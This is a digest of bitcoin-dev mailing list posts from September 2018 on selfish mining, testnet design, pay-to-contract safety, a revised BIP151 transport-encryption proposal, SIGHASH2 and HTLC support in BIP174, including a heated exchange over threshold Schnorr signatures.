From onelineproof at gmail.com  Sat Sep  1 00:11:19 2018
From: onelineproof at gmail.com (Andrew)
Date: Sat, 1 Sep 2018 00:11:19 +0000
Subject: [bitcoin-dev] Selfish Mining Prevention
Message-ID: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>

As I understand, selfish mining is an attack where miners collude to
mine at a lower hashrate then with all miners working independently.
What are the current strategies used to prevent this and what are the
future plans?

One idea I have is to let the block reward get "modulated" according
to peak hashrate. Say p is the peak hashrate for 365 periods (1 year)
consisting of 144 blocks, h is the hashrate of the last 144 block (1
day) period, and r is the base subsidy (12.5 BTC currently). You can
then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
peak you get the full reward. Otherwise you get less, down to a min of
0.5 r.

If miners were to collude to mine at a lower than peak hashrate, then
they may be able to do it profitably for 144 blocks, but after that,
the reward would get modulated and it wouldn't be so much in their
interest to continue mining at the lower hashrate.

What flaws are there with this? I know it could be controversial due
to easier mining present for early miners, so maybe it would have to
be done in combination with a new more dynamic difficulty adjustment
algorithm. But I don't see how hashrate can continue rising
indefinitely, so a solution should be made for selfish mining.

Also when subsidies stop and a fee market is needed, I guess a portion
of the fees can be withheld for later if hashrate is not at peak.


-- 
PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647

From rhavar at protonmail.com  Sat Sep  1 14:47:53 2018
From: rhavar at protonmail.com (rhavar at protonmail.com)
Date: Sat, 01 Sep 2018 14:47:53 +0000
Subject: [bitcoin-dev] Testnet3 Reest
In-Reply-To: <CAAS2fgSF=hx581aGUBVv6zardKG4gex43B-jZbAu0a9Rupg1WQ@mail.gmail.com>
References: <CABuOfuh7M6siJW1FzXajsBSeYSu=TBEgx9SAmCbwnP=yb7rJOQ@mail.gmail.com>
	<20180830200239.ujuzh7pitcuatdt3@petertodd.org>
	<7E247E56-38A5-4B99-941A-A2CC837D2567@xbt.hk>
	<CAAS2fgSF=hx581aGUBVv6zardKG4gex43B-jZbAu0a9Rupg1WQ@mail.gmail.com>
Message-ID: <nSgDJydDNqQwbRrVzhJ7PsRHnVr2eqXTA8I2X4p-Wm16M4TW4PCSPU20q9nUrO-2Hm8WODFILJqb7drIaY74wSnCQ3cAcDvqfHZ7b_mOM6w=@protonmail.com>

I think I mentioned it before, but seems semi-relevant to this thread so I'd like to throw my vote behind pretty tiny blocks on testnet (like max 50-100k weight) to try help simulate a fee-market like situation.

(Although lately there's been a lot of testnet spam and full blocks, which has really made testing easier. But I don't know how long this situation will last)


-Ryan

??????? Original Message ???????
On August 30, 2018 7:06 PM, Gregory Maxwell via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org> wrote:

> On Thu, Aug 30, 2018 at 11:21 PM Johnson Lau via bitcoin-dev
> bitcoin-dev at lists.linuxfoundation.org wrote:
>
> > A public testnet is still useful so in articles people could make references to these transactions.
> > Maybe we could have 2 testnets at the same time, with one having a smaller block size?
>
> I would much rather have a signed blocks testnet, with a predictable
> structured reorg pattern* (and a config flag so you can make your node
> ignore all blocks that are going to get reorged out in a reorg of nth
> or larger). There are many applications where the mined testnet just
> doesn't give you anything useful... it's too stable when you want it
> to be a bit unstable and too wildly unstable when you want a bit of
> stability-- e.g. there are very few test cases where a 20,000 block
> reorg does anything useful for you; yet they happen on testnet.
>
> We looked at doing this previously in Bitcoin core and jtimon had some
> patches, but the existing approach increased the size of the
> blockindex objects in memory while not in signed testnet mode. This
> could probably have been fixed by turning one of the fields like the
> merkel root into a union of it's normal value and a pointer a
> look-aside block index that is used only in signed block testnet mode.
>
> Obviously such a mode wouldn't be a replacement for an ordinary
> testnet, but it would be a useful middle ground between regtest (that
> never sees anything remotely surprising and can't easily be used for
> collaborative testing) and full on testnet where your attempts to test
> against ordinary noise require you cope your entirely universe being
> removed from existence and replaced by something almost but not quite
> entirely different at the whim of some cthulhuian blind idiot god.
>
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev



From rsomsen at gmail.com  Sat Sep  1 17:26:54 2018
From: rsomsen at gmail.com (Ruben Somsen)
Date: Sun, 2 Sep 2018 02:26:54 +0900
Subject: [bitcoin-dev] Guiding transaction fees towards a more censorship
	resistant outcome
Message-ID: <CAPv7TjbnsqHwW=Oj7n_WJFR4vp1ND78NgV0=Ftj5doNuKOxLCg@mail.gmail.com>

When a user creates a transaction with a fee attached, they are
incentivizing miners to add this transaction to the blockchain. The
task is usually not very specific -- as long as it ends up in a valid
chain with the most Proof-of-Work, miners get paid. The payment is an
incentive for miners to act in the way that users desire.

To the user, there?s an individual benefit: their transaction gets
added. To the network, there?s a shared benefit: all fees add to the
security of other transactions in the chain. Miners can choose to
ignore the incentives, but they would be leaving money on the table
(and eventually get replaced by more competitive miners).

Transactions from Bitcoin Core are slightly more specific about what
they ask miners to do. Every transaction is only valid at a block
height that is one higher than the last block. This incentivizes
miners to build on top of the last block, instead of going back and
reorganizing the blockchain. This is especially important in a future
scenario where the fee reward is larger than the block reward.

BIP 115* by Luke-jr is even more specific. It enables users to create
transactions which are only valid if they are mined on top of a
specific block. While originally designed as a form of replay
protection, it actually serves as a deterrent for miners to reorganize
the blockchain. If they orphan a block, it will invalidate
transactions that demanded the inclusion of the orphaned block. This
increases the cost of intentionally reorganizing the blockchain.

Coinjoin**, the act of combining payments of multiple users into a
single transaction, can be seen as yet another method for users to be
more specific. The fate of their payments are now intertwined with
that of others. If miners wish to censor a single payment, they have
to reject the entire transaction, and the associated fee amount.
Techniques like mimblewimble simplify this process, by making coinjoin
non-interactive.

This brings us to a theoretical scenario where:

- every block contains only a single coinjoin transaction
- the validity of this transaction depends on the inclusion of a
specific previous block
- the block reward is negligible compared to transaction fees

In this scenario, if miners wish to undo a specific transaction that
happened two blocks ago, they would have to create three empty blocks
(receiving negligible compensation) in order to overtake the longest
chain. And even then, users can still refuse to let their new
transactions be mined on top of the empty blocks, disincentivizing
such behavior completely.

While not easy to achieve in practice (e.g. resolving natural forks
becomes more complicated), it demonstrates that users can become more
empowered than they are today, benefitting censorship resistance***.
It is this line of thinking that I wish to convey. Perhaps it may
inspire further ideas in this direction.

-- Ruben Somsen


* BIP 115: https://github.com/bitcoin/bips/blob/master/bip-0115.mediawiki

** Coinjoin: https://bitcointalk.org/index.php?topic=279249.0

*** Risk sharing principle:
https://github.com/libbitcoin/libbitcoin/wiki/Risk-Sharing-Principle

From apoelstra at wpsoftware.net  Mon Sep  3 00:05:18 2018
From: apoelstra at wpsoftware.net (Andrew Poelstra)
Date: Mon, 3 Sep 2018 00:05:18 +0000
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
Message-ID: <20180903000518.GB18522@boulet.lan>

On Wed, Aug 29, 2018 at 08:09:36AM -0400, Erik Aronesty wrote:
> Note:
> 
> This spec cannot be used directly with a shamir scheme to produce
> single-round threshold multisigs, because shares of point R would need to
> be broadcast to share participants in order to produce valid single
> signatures.
> 
> (R, s) schemes can still be used "online", if share participants publish
> the R(share).... but, not sure if it matter much, this choice eliminates
> offline multiparty signing in exchange for batch validation.
>

Please stop with this FUD. No tradeoff was made. There are no non-interactive
Schnorr signatures.


Andrew
 

-- 
Andrew Poelstra
Mathematics Department, Blockstream
Email: apoelstra at wpsoftware.net
Web:   https://www.wpsoftware.net/andrew

"A goose alone, I suppose, can know the loneliness of geese
 who can never find their peace,
 whether north or south or west or east"
       --Joanna Newsom

-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 455 bytes
Desc: not available
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180903/cec88ce8/attachment-0001.sig>

From ZmnSCPxj at protonmail.com  Mon Sep  3 09:26:35 2018
From: ZmnSCPxj at protonmail.com (ZmnSCPxj)
Date: Mon, 03 Sep 2018 09:26:35 +0000
Subject: [bitcoin-dev] Reinterpretations of contracts in different
	pay-to-contract schemes
Message-ID: <as13xXV08xcjwms8bpl8TJF-G0RgUBTEK_Q8jqxQ742Yc-w3jpQjeJf0tTQXogcPsHF7uEV2TYy6eF8jF9JQNrKOMlf5vWuDSMVDUdao5Nw=@protonmail.com>

Good morning all,

I am wondering if there is the possibility of an issue arising when different pay-to-contract schemes are used on Bitcoin.

Specifically, I wonder, if it may be possible to reinterpret the byte serialization of a contract under one scheme as the byte serialization of a different contract under another scheme.  The user may expect to have committed to a contract under the first scheme, but is rudely made aware that she has also committed to a different contract under a scheme she is unaware of.

For instance, if some independent protocol uses pay-to-contract, it may be possible for the contract to be reinterpreted as a Bitcoin SCRIPT under Taproot, leading to a contract that can be reinterpreted as a Bitcoin SCRIPT and allowing a Bitcoin-level UTXO to be stolen without knowledge of the private key.

I thought of this a little while ago and mentioned it here:https://github.com/rgb-org/spec/issues/61

Now, it may be possible to use the hash of the contract, but if Taproot uses a hash of the script also and the same hash function is used, then the bytes of the contract could be reinterpreted as a Bitcoin SCRIPT program, possibly leading to a trivial-to-solve SCRIPT with enough hacking.

If this is indeed a concern, then I propose, that pay-to-contract schemes should pay to the below tweak:

     Q = P + SHA256d(P || Scheme || C) * G

Where `Scheme` is 256 bits (32 bytes) scheme identifier.  For Taproot, it could be the genesis block ID.  Then other pay-to-contract schemes must ensure that they use a `Scheme` ID that is different with high probability from other `Scheme` IDs, in order to ensure that reinterpretation of contracts is impossible.

Regards,
ZmnSCPxj
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180903/3ef6b93b/attachment-0001.html>

From dev at jonasschnelli.ch  Mon Sep  3 12:16:19 2018
From: dev at jonasschnelli.ch (Jonas Schnelli)
Date: Mon, 3 Sep 2018 14:16:19 +0200
Subject: [bitcoin-dev] Overhauled BIP151
Message-ID: <640D015D-3DDB-43C4-9752-96ADABF64C91@jonasschnelli.ch>

Hi

During work on the implementation of BIP151 [1] I figured out that the current
published proposal could be further optimized.

I wrote an overhauled BIP151 specification with some ? partially radical ?
changes.

Now it?s unclear to me if this should be published under a new BIP nr. or if it
is acceptable to change the existing 151 proposal.
If a new BIP number would be required, I think withdrawing BIP151 should be
done (which somehow indicates we should alter 151).

The only BIP151 implementation I?m aware of is the one from Armory [2].
BCoins implementation has been removed [3].

The new proposal draft is available here:
https://gist.github.com/jonasschnelli/c530ea8421b8d0e80c51486325587c52

Major changes
=============
- the encryption handshake no longer requires the v1 protocol, it?s a pure
  32bytes-per-side ?pseudorandom" key exchange that happens before anything else.
- the multi message envelope has been removed.
- a new NODE_ENCRYPTED service bit
- the key derivation and what communication direction uses what key is now more
  specific
- the length of a packet uses now a 3-byte integer with 23 available bits
- introduction of short-command-ID (ex.: uint8_t 13 == INV, etc.) which result in
  some v2 messages require less bandwidth then v1
- rekeying doesn?t require a message and can be signaled in the most
  significant bit in the packet-size field


Points that are in discussion and may be added to the BIP (or to a new one):

Hybrid NewHope key exchange
===========================
The current ECDH key exchange is vulnerable to Shor?s algorithm and is thus not
considered quantum-safe.
Following TORs approach [4] by adding a NewHope [5] key-exchange the handshake
protocol would very likely make the encryption PQ safe with little costs.
There is also a straight forward implementation [6] from the NewHope team that
has been submitted to NIST PQC project.

Inefficiency of ChaCha20Poly1305 at openssh
========================================
The proposed AEAD could eventually be further optimized.
ChaCha20Poly1305 at openssh uses at least three rounds of ChaCha20 which
eventually can be reduced to two (messages below <=64 bytes [inv, ping,
pong,...] only require one round of ChaCha20, but two for the Poly1305 key and
the message length encryption where the Poly1305 key chacha round ?throws away?
32 bytes).


I would suggest that we don?t rehash discussions about the general
concept of encrypting the traffic. This has already been discussed [7][8].

I hope we can limit this thread to discuss further ideas for optimisation as well as
technical details of the published proposal or its implementation.


[1] https://github.com/bitcoin/bitcoin/pull/14032
[2] https://github.com/goatpig/BitcoinArmory/pull/510
[3] https://github.com/bcoin-org/bcoin/commit/41af7acfd68b0492a6442865afd439300708e662
[4] https://gitweb.torproject.org/user/isis/torspec.git/plain/proposals/XXX-newhope-hybrid-handshake.txt?h=draft/newhope
[5] https://eprint.iacr.org/2015/1092
[6] https://github.com/newhopecrypto/newhope

[7] https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2017-February/013565.html
[8] https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2016-June/012826.html


Thanks
-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 833 bytes
Desc: Message signed with OpenPGP
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180903/82a75538/attachment-0001.sig>

From decker.christian at gmail.com  Mon Sep  3 13:53:33 2018
From: decker.christian at gmail.com (Christian Decker)
Date: Mon, 03 Sep 2018 15:53:33 +0200
Subject: [bitcoin-dev] SIGHASH2 for version 1 witness programme
In-Reply-To: <23B1C9E3-9C94-43A3-A543-0AF9A8C10C7E@xbt.hk>
References: <9CCCE945-9432-41B9-8559-AFE7CF233603@xbt.hk>
	<B35E0135-2135-405A-9627-F67EFB9D2614@xbt.hk>
	<87sh2vlgsc.fsf@gmail.com>
	<23B1C9E3-9C94-43A3-A543-0AF9A8C10C7E@xbt.hk>
Message-ID: <87in3mlmaq.fsf@gmail.com>

Johnson Lau <jl2012 at xbt.hk> writes:

> Great, I?ll revise it.
>
> Follow-up questions:
>
> 1. Is there any useful case which one would like to use NOINPUT with
> scriptCode and/or scriptPubKey committed? (Note that with
> taproot/MAST, scriptCode and scriptPubKey are not
> interchangeable. scriptPubKey commits to all branches, and scriptCode
> is just one script branch). If yes, we could make this configurable.

There is the poor man's malleability fix that you get if you make only
the previous outpoint rewritable, but that use-case is better covered by
segwit already, and since both of our proposals would be for segwit
outputs only, I don't see a point in doing that.

> 2. Which of the following approaches is better?
> A) sign scriptPubKey in every cases except NOINPUT
> B) sign the type (P2SH-segwit vs. Native-segwit) of scriptPubKey in every cases, including NOINPUT
> C) all of the above
> D) none of the above

What do we effectively gain by committing to the scriptPubkey type? Is
the concern here that we might run into ambiguity about whether this is
a MAST, P2SH, or similar output, allowing an attacker to sideload
unwanted effects?

> Option B is very easy to implement as SignatureHash() could
> distinguish the type by the size of scriptSig in TxTo. Option A is
> more complicated as GenericTransactionSignatureChecker needs to know
> the scriptPubKey.
>
> If the only reason for doing this is to allow hardware wallet to
> distinguish the segwit type, option B is probably enough. This is also
> compatible with eltoo.

Agreed on compatibility :-)

> Option A is useful when a hardware wallet reuses the same public key
> in different scripts, but it couldn?t be applied to NOINPUT
>
> 3. Is the proposed DUALOUTPUT somehow useful for eltoo? Eltoo use
> NOINPUT|SINGLE to allow fee pumping, since it is an
> one-input-one-output tx. This is not possible with the existing LN as
> the tx is one-input-two-output. If we had DUALOUTPUT which signs the
> matched and last output, fee-pumping would be possible in the existing
> LN.

That's a very strange concept, but it strongly relies on the structure
of the commitment, having two outputs. As soon as we have HTLCs included
in the commitment we no longer have 2 outputs (2 for the endpoints, and
1 as a base for the two-phase HTLC resolution), so this would be a
rather brittle fix or would require major restructuring of LN imho.

Cheers,
Christian

From eric at voskuil.org  Tue Sep  4 01:37:30 2018
From: eric at voskuil.org (Eric Voskuil)
Date: Tue, 4 Sep 2018 10:37:30 +0900
Subject: [bitcoin-dev] Overhauled BIP151
In-Reply-To: <640D015D-3DDB-43C4-9752-96ADABF64C91@jonasschnelli.ch>
References: <640D015D-3DDB-43C4-9752-96ADABF64C91@jonasschnelli.ch>
Message-ID: <3AA959AE-B0F5-459F-A6BA-50D91C746B5D@voskuil.org>

Without commenting on the other merits of either proposal, the addition of the service flag resolves bip151?s previously-discussed lack of backward compatibility.

e

> On Sep 3, 2018, at 21:16, Jonas Schnelli via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org> wrote:
> 
> Hi
> 
> During work on the implementation of BIP151 [1] I figured out that the current
> published proposal could be further optimized.
> 
> I wrote an overhauled BIP151 specification with some ? partially radical ?
> changes.
> 
> Now it?s unclear to me if this should be published under a new BIP nr. or if it
> is acceptable to change the existing 151 proposal.
> If a new BIP number would be required, I think withdrawing BIP151 should be
> done (which somehow indicates we should alter 151).
> 
> The only BIP151 implementation I?m aware of is the one from Armory [2].
> BCoins implementation has been removed [3].
> 
> The new proposal draft is available here:
> https://gist.github.com/jonasschnelli/c530ea8421b8d0e80c51486325587c52
> 
> Major changes
> =============
> - the encryption handshake no longer requires the v1 protocol, it?s a pure
>  32bytes-per-side ?pseudorandom" key exchange that happens before anything else.
> - the multi message envelope has been removed.
> - a new NODE_ENCRYPTED service bit
> - the key derivation and what communication direction uses what key is now more
>  specific
> - the length of a packet uses now a 3-byte integer with 23 available bits
> - introduction of short-command-ID (ex.: uint8_t 13 == INV, etc.) which result in
>  some v2 messages require less bandwidth then v1
> - rekeying doesn?t require a message and can be signaled in the most
>  significant bit in the packet-size field
> 
> 
> Points that are in discussion and may be added to the BIP (or to a new one):
> 
> Hybrid NewHope key exchange
> ===========================
> The current ECDH key exchange is vulnerable to Shor?s algorithm and is thus not
> considered quantum-safe.
> Following TORs approach [4] by adding a NewHope [5] key-exchange the handshake
> protocol would very likely make the encryption PQ safe with little costs.
> There is also a straight forward implementation [6] from the NewHope team that
> has been submitted to NIST PQC project.
> 
> Inefficiency of ChaCha20Poly1305 at openssh
> ========================================
> The proposed AEAD could eventually be further optimized.
> ChaCha20Poly1305 at openssh uses at least three rounds of ChaCha20 which
> eventually can be reduced to two (messages below <=64 bytes [inv, ping,
> pong,...] only require one round of ChaCha20, but two for the Poly1305 key and
> the message length encryption where the Poly1305 key chacha round ?throws away?
> 32 bytes).
> 
> 
> I would suggest that we don?t rehash discussions about the general
> concept of encrypting the traffic. This has already been discussed [7][8].
> 
> I hope we can limit this thread to discuss further ideas for optimisation as well as
> technical details of the published proposal or its implementation.
> 
> 
> [1] https://github.com/bitcoin/bitcoin/pull/14032
> [2] https://github.com/goatpig/BitcoinArmory/pull/510
> [3] https://github.com/bcoin-org/bcoin/commit/41af7acfd68b0492a6442865afd439300708e662
> [4] https://gitweb.torproject.org/user/isis/torspec.git/plain/proposals/XXX-newhope-hybrid-handshake.txt?h=draft/newhope
> [5] https://eprint.iacr.org/2015/1092
> [6] https://github.com/newhopecrypto/newhope
> 
> [7] https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2017-February/013565.html
> [8] https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2016-June/012826.html
> 
> 
> Thanks
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev

From alex.bosworth at gmail.com  Tue Sep  4 03:24:01 2018
From: alex.bosworth at gmail.com (Alex Bosworth)
Date: Mon, 3 Sep 2018 20:24:01 -0700
Subject: [bitcoin-dev] Extending BIP174 for HTLCs
Message-ID: <CAFLuHNFD8vTyYfF+64e2Xs_HympQs4ufzSAxQ96jkLZg=pdm7A@mail.gmail.com>

I've been experimenting with a format tag for BIP 174 to help support
HTLC scripts I've been working with.

Not sure on the best format for this, but what I have been thinking
about is a new input type that defines elements that should be
inserted in the final p2sh/p2wsh stack such as a preimage or a refund
path flag.

Type: Additional Stack Element ADDITIONAL_STACK_ELEMENT = 0xXX

Key: The index in the stack to insert a value (uint32 LE)

{0xXX}|{Stack index}

Value: The value to push into the stack for a redeem script or witness
script at the specified index.

{value}

So my flow is:

1. Create blank PSBT (attaching locktime, anticipating final weight to
adjust outputs for fees)
2. Update with redeem scripts and/or witness scripts
3. Update with sighashes
4. Sign: generate partial signature
5. Attach additional stack elements for the required non-signature elements
6. Finalize to create the final scriptsig and/or witness
7. Extract the signed transaction for broadcast

This may be overkill or overly generic, has anyone else thought of how
to use PSBTs in an HTLC context?

-- 
Sent from my iPhone

From pieter.wuille at gmail.com  Tue Sep  4 16:57:28 2018
From: pieter.wuille at gmail.com (Pieter Wuille)
Date: Tue, 4 Sep 2018 09:57:28 -0700
Subject: [bitcoin-dev] Extending BIP174 for HTLCs
In-Reply-To: <CAFLuHNFD8vTyYfF+64e2Xs_HympQs4ufzSAxQ96jkLZg=pdm7A@mail.gmail.com>
References: <CAFLuHNFD8vTyYfF+64e2Xs_HympQs4ufzSAxQ96jkLZg=pdm7A@mail.gmail.com>
Message-ID: <CAPg+sBhiMPAc4tzsMVBjGuG2RqKLTrD9F0vm9rvpp6DrSm3T1Q@mail.gmail.com>

On Tue, Sep 4, 2018, 04:32 Alex Bosworth via bitcoin-dev <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> I've been experimenting with a format tag for BIP 174 to help support
> HTLC scripts I've been working with.
>

I've been thinking about this as well.

A useful way to look at it IMHO is to see a hash as the analogue of a
public key, and the preimage as the analogue of a signature.

That would suggest adding two fields to PSBT:
* A request for the preimage of a given hash (similar to the pubkey/path
field currently)
* A revealed preimage for a given hash (similar to the partial signature
field currently).

The workflow would in this case would be:
* An updater recognizes an output/script as being one that requires a
preimage, and adds a preimage request field to the input (along with pubkey
fields for all involved keys).
* A "signer" who knows the preimage sees the request field, verifies he's
willing to divulge the secret, and adds a preimage field (along with any
signatures he may be able to create).
* A finalizer who is compatible with the type of hashlock script combines
all signatures and preimages into a final scriptSig/witness stack.

An obvious difficulty is having updaters and finalizers which are
compatible with all possible variations of hashlocks and other scripts.

Not sure on the best format for this, but what I have been thinking
> about is a new input type that defines elements that should be
> inserted in the final p2sh/p2wsh stack such as a preimage or a refund
> path flag.
>

That's one approach to reducing the complexity of the finalizer: adding
information about the composition of the scriptSig to the PSBT itself.
However, I don't think that approach scales very well (you'd need new
fields for all kinds of new script constructions). In particular, dealing
with multiple possible satisfactions may complicate things, especially when
the number of combinations is intractable.

I've been working on another approach that doesn't involve changes to PSBT,
but instead uses an easily-parsable subset of script (which includes
and/or/threshold/pubkey/locktimes/hashlocks). I hope to publish something
soon about it.

Cheers,

-- 
Pieter
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180904/5dd946d0/attachment.html>

From apoelstra at wpsoftware.net  Wed Sep  5 13:05:59 2018
From: apoelstra at wpsoftware.net (Andrew Poelstra)
Date: Wed, 5 Sep 2018 13:05:59 +0000
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
Message-ID: <20180905130559.GH18522@boulet.lan>

On Wed, Sep 05, 2018 at 08:26:14AM -0400, Erik Aronesty wrote:
> Why would you call it FUD?   All the weird hemming and hawing about it is
> really strange to me.  The more I look into it and speak to professors
> about i, the more it seems "so trivial nobody really talks about it".
> 
> 1. Generate an M of N shared public key (done in advance of signing ....
> this gets you the bitcoin address)
> 2. Generate signature fragments (this can be done offline, with no
> communication between participants)
> 
> Detailed explanation with code snippets:
> 
> https://medium.com/@simulx/an-m-of-n-bitcoin-multisig-scheme-e7860ab34e7f
>

The hemming and hawing is because you've been repeatedly told that your
scheme doesn't work, and to please implement it in some computer algebra
system so that you can see that (or so we can see where your mistake is),
and you instead continue to post incomplete/incoherent copies of the same
thing across multiple mediums - Reddit, this list, Bitcointalk, Medium,
etc ad nauseum.

It's distracting and offensive to people who have spent a lot of time and
energy thinking about this stuff, and more importantly it causes confusion
in the public eye. Phrasings like "weird hemming and hawing" suggest that
we don't know/don't care about some insight you have, which is not true.
This is why your posts are FUD.

For example, in your linked post I looked at every single instance of the
character 'k' and *not one of them* defined the value 'k' from which 'R'
is derived in the signing procedure.


Of course there is no possible value, individual signers cannot learn 'R'
at signing time without interaction, and your whole scheme is broken. Given
the number of times you've been told this, I find it hard to believe that
this was an honest mistake.



Andrew



-- 
Andrew Poelstra
Research Director, Mathematics Department, Blockstream
Email: apoelstra at wpsoftware.net
Web:   https://www.wpsoftware.net/andrew

"Make it stop, my love; we were wrong to try
 Never saw what we could unravel in traveling light
 Nor how the trip debrides like a stack of slides
 All we saw was that time is taller than space is wide"
       --Joanna Newsom

-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 455 bytes
Desc: not available
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180905/8174ffbf/attachment.sig>

From karljohan-alm at garage.co.jp  Wed Sep  5 03:00:39 2018
From: karljohan-alm at garage.co.jp (Karl-Johan Alm)
Date: Wed, 5 Sep 2018 12:00:39 +0900
Subject: [bitcoin-dev] Testnet3 Reest
In-Reply-To: <CAAS2fgSF=hx581aGUBVv6zardKG4gex43B-jZbAu0a9Rupg1WQ@mail.gmail.com>
References: <CABuOfuh7M6siJW1FzXajsBSeYSu=TBEgx9SAmCbwnP=yb7rJOQ@mail.gmail.com>
	<20180830200239.ujuzh7pitcuatdt3@petertodd.org>
	<7E247E56-38A5-4B99-941A-A2CC837D2567@xbt.hk>
	<CAAS2fgSF=hx581aGUBVv6zardKG4gex43B-jZbAu0a9Rupg1WQ@mail.gmail.com>
Message-ID: <CALJw2w6a2YMS=nso5_6Rsom8qgNt93me3sv7Gr1vrHNcrZOVHQ@mail.gmail.com>

On Fri, Aug 31, 2018 at 9:43 PM Gregory Maxwell via bitcoin-dev
<bitcoin-dev at lists.linuxfoundation.org> wrote:
> We looked at doing this previously in Bitcoin core and jtimon had some
> patches,  but the existing approach increased the size of the
> blockindex objects in memory  while not in signed testnet mode.   This
> could probably have been fixed by turning one of the fields like the
> merkel root into a union of it's normal value and a pointer a
> look-aside block index that is used only in signed block testnet mode.

I am currently working on an implementation that simply puts a global
mapping of block hash to signature that is transparently
(de)serialized in the block header.

We were looking into various ways to stuff the signature into the
actual header itself without changing its size, but this looked like
it required truncating the prevblock/merkleroots and such, which
seemed a bit too invasive.

I don't think my approach with a global mapping to sig differs in any
meaningful way from your suggested union, but corrections welcome.

The code is here: https://github.com/kallewoof/bitcoin/tree/signet

I believe jtimon is interested in helping out, and Jeremy Rubin has
also said he wants to help.

From erik at q32.com  Wed Sep  5 12:26:14 2018
From: erik at q32.com (Erik Aronesty)
Date: Wed, 5 Sep 2018 08:26:14 -0400
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <20180903000518.GB18522@boulet.lan>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
Message-ID: <CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>

Why would you call it FUD?   All the weird hemming and hawing about it is
really strange to me.  The more I look into it and speak to professors
about i, the more it seems "so trivial nobody really talks about it".

1. Generate an M of N shared public key (done in advance of signing ....
this gets you the bitcoin address)
2. Generate signature fragments (this can be done offline, with no
communication between participants)

Detailed explanation with code snippets:

https://medium.com/@simulx/an-m-of-n-bitcoin-multisig-scheme-e7860ab34e7f



On Sun, Sep 2, 2018 at 8:05 PM Andrew Poelstra <apoelstra at wpsoftware.net>
wrote:

> On Wed, Aug 29, 2018 at 08:09:36AM -0400, Erik Aronesty wrote:
> > Note:
> >
> > This spec cannot be used directly with a shamir scheme to produce
> > single-round threshold multisigs, because shares of point R would need to
> > be broadcast to share participants in order to produce valid single
> > signatures.
> >
> > (R, s) schemes can still be used "online", if share participants publish
> > the R(share).... but, not sure if it matter much, this choice eliminates
> > offline multiparty signing in exchange for batch validation.
> >
>
> Please stop with this FUD. No tradeoff was made. There are no
> non-interactive
> Schnorr signatures.
>
>
> Andrew
>
>
> --
> Andrew Poelstra
> Mathematics Department, Blockstream
> Email: apoelstra at wpsoftware.net
> Web:   https://www.wpsoftware.net/andrew
>
> "A goose alone, I suppose, can know the loneliness of geese
>  who can never find their peace,
>  whether north or south or west or east"
>        --Joanna Newsom
>
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180905/c41fdcc4/attachment-0001.html>

From erik at q32.com  Wed Sep  5 13:14:55 2018
From: erik at q32.com (Erik Aronesty)
Date: Wed, 5 Sep 2018 09:14:55 -0400
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <20180905130559.GH18522@boulet.lan>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
